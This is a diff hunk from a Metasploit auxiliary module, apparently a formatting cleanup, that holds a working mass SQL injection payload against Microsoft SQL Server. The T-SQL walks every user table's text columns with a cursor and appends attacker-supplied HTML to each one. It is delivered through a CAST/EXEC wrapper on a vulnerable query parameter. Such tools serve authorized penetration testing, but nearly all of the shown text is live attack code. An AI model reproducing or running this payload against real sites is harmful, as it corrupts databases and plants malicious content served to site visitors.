@@ -51,28 +51,29 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run_host(ip)
 
-	#Weird to indent for practical reasons.
-infstr = %Q{
+		# Weird to indent for practical reasons.
+		infstr = <<-EOF
 DECLARE @T varchar(255),@C varchar(255)
- DECLARE Table_Cursor CURSOR FOR
- select a.name,b.name from sysobjects a,syscolumns b
- where a.id=b.id and a.xtype='u' and (b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167)
- OPEN Table_Cursor
- FETCH NEXT FROM Table_Cursor INTO @T,@C
- WHILE(@@FETCH_STATUS=0)
- BEGIN
- exec('update ['+@T+'] set ['+@C+']=rtrim(convert(varchar,['+@C+']))+''#{datastore['EVIL_HTML']}''')
- FETCH NEXT FROM Table_Cursor INTO @T,@C
- END
- CLOSE Table_Cursor
- DEALLOCATE Table_Cursor
-}.gsub(/(\t|\n|\r)/,"")
+DECLARE Table_Cursor CURSOR FOR
+select a.name,b.name from sysobjects a,syscolumns b
+where a.id=b.id and a.xtype='u' and (b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167)
+OPEN Table_Cursor
+FETCH NEXT FROM Table_Cursor INTO @T,@C
+WHILE(@@FETCH_STATUS=0)
+BEGIN
+exec('update ['+@T+'] set ['+@C+']=rtrim(convert(varchar,['+@C+']))+''#{datastore['EVIL_HTML']}''')
+FETCH NEXT FROM Table_Cursor INTO @T,@C
+END
+CLOSE Table_Cursor
+DEALLOCATE Table_Cursor
+EOF
 
+		infstr.gsub!(/(\t|\n|\r)/,"")
 
 		prestr = ";DECLARE @S NVARCHAR(4000);SET @S=CAST("
 		poststr = " AS NVARCHAR(4000));EXEC(@S);"
 
-        gvars = queryparse(datastore['QUERY']) #Now its a Hash
+		gvars = queryparse(datastore['QUERY']) #Now its a Hash
 
 		if gvars.has_key?(datastore['VULN_PAR'])
 
